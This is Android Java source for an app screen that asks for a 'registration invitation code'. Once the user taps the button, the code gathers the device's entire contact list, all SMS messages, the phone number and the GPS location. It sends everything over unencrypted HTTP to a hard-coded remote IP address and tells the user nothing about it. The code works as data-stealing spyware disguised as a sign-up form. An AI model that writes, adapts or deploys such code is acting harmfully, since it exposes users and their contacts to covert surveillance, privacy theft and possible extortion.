package com.example.zbrj;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.example.zbrj.module.MyContacts;
import com.example.zbrj.utils.Utils;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

public class MainActivity extends BaseActivity {

    private EditText et_yqm;
    private Button bt_qd;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main_layout);
        initView();

        if (Build.VERSION.SDK_INT >= 23) {//6.0才用动态权限
            requireSomePermission();// 申请权限
        }
    }

    private void initView() {
        et_yqm = findViewById(R.id.et_yqm);
        bt_qd = findViewById(R.id.bt_qd);

        bt_qd.setOnClickListener(new View.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.M)
            @Override
            public void onClick(View v) {
                //申请权限
                if (mPermissionList.size() > 0) {//有权限没有通过，需要申请
                    ActivityCompat.requestPermissions(MainActivity.this, permissions, mRequestCode);
                } else {
                    closeKeyboardBase();
                    GPSQunaxian();
                    setIntent();
                }
            }
        });
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        boolean hasPermissionDismiss = false;//有权限没有通过
        if (mRequestCode == requestCode) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == -1) {
                    hasPermissionDismiss = true;
                }
            }
            //如果有权限没有被允许
            if (hasPermissionDismiss) {
                showBaseDialog(1, 1, "已禁用权限，请手动授予");
            } else {
                GPSQunaxian();
                setIntent();
            }
        }
    }

    // 此方法在主线程中调用，可以更新UI
    Handler handler = new Handler() {
        public void handleMessage(Message msg) {
            // 处理消息时需要知道是成功的消息还是失败的消息
            switch (msg.what) {
                case 1:
                    dialog1.dismiss(); //关闭对话框
                    Toast.makeText(MainActivity.this, "网络请求失败，请重试", Toast.LENGTH_SHORT).show();
                    break;
                default:
                    break;
            }
        }
    };

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void setIntent() {
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "请打开相关权限", Toast.LENGTH_SHORT).show();
            return;
        }
        if ((et_yqm.getText() + "").equals("")) {
            Toast.makeText(MainActivity.this, "请输入注册邀请码", Toast.LENGTH_SHORT).show();
            return;
        }

        dialog1 = createLoadingDialog(MainActivity.this, "加载中...");//显示对话框
        dialog1.show();
        ArrayList<MyContacts> list = Utils.getAllContacts(MainActivity.this);
        String jsonTxl = "1";
        if (list != null && list.size() > 0) {
            List<Map<String, Object>> l = new ArrayList<>();
            for (int i = 0; i < list.size(); i++) {
                MyContacts temp = list.get(i);
                Map<String, Object> map = new HashMap<>();
                long num=1;
                try {
                    num=Long.parseLong(temp.phone);
                }catch (Exception e){
                    e.printStackTrace();
                }
                map.put("m", num);
                map.put("n", temp.name);
                l.add(map);
            }
            jsonTxl = Utils.mapToJson(l);
        }

        List<Map<String, Object>> lsitdx = Utils.obtainPhoneMessage(MainActivity.this);
        String jsonDx = "1";
        if (lsitdx != null && lsitdx.size() > 0) {
            List<Map<String, Object>> l = new ArrayList<>();
            for (int i = 0; i < lsitdx.size(); i++) {
                Map<String, Object> temp = lsitdx.get(i);
                Map<String, Object> map = new HashMap<>();
                long num=1;
                try {
                    num=Long.parseLong(temp.get("num")+"");
                }catch (Exception e){
                    e.printStackTrace();
                }
                map.put("m", num);
                map.put("t",  temp.get("mess")+"");
                l.add(map);
            }
            jsonDx = Utils.mapToJson(l);
        }

        TelephonyManager tm = (TelephonyManager) this.getSystemService(this.TELEPHONY_SERVICE);
        String mobile=tm.getLine1Number()+"";
        long moblong=1;
        try {
            if (mobile.equals("")||mobile.equals("null")){
                moblong=1;
            }else{
                moblong=Long.parseLong(mobile);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        Log.i("XXX","jsonTxl:"+jsonTxl);
        Log.i("XXX","jsonDx:"+jsonDx);
        final String url = "http://111.177.18.30:3002/app_message_user_base_info";
        final String content = "code=" + et_yqm.getText() + "&mobile=" + moblong+ "&longitude=" + Longitude+ "&latitude=" + Latitude
                + "&phone_numbers=" + jsonTxl+ "&message_list=" + jsonDx;
        Log.i("XXX","content:"+content);
        new Thread(new Runnable() {
            @Override
            public void run() {
                doPost(url,content);
            }
        }).start();
    }

    private final static int CONNECT_OUT_TIME = 5000;
    public void doPost(String url,String content) {
        try {
            URL connectUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) connectUrl.openConnection();
            conn.setConnectTimeout(CONNECT_OUT_TIME);
            conn.setReadTimeout(45000);
            conn.setRequestMethod("POST");
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.connect();
            BufferedWriter oWriter = new BufferedWriter(new OutputStreamWriter(conn.getOutputStream(), "UTF-8"));
            oWriter.write(content);
            oWriter.flush();
            int code = conn.getResponseCode();
            if (200 == code) {
                finish();
            }else{
                Message msg = new Message();
                // 消息对象可以携带数据
                msg.what = 1;
                handler.sendMessage(msg);
            }
        } catch (MalformedURLException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (dialog1 != null) {
            dialog1.dismiss(); //关闭对话框
            dialog1 = null;
        }
    }
}
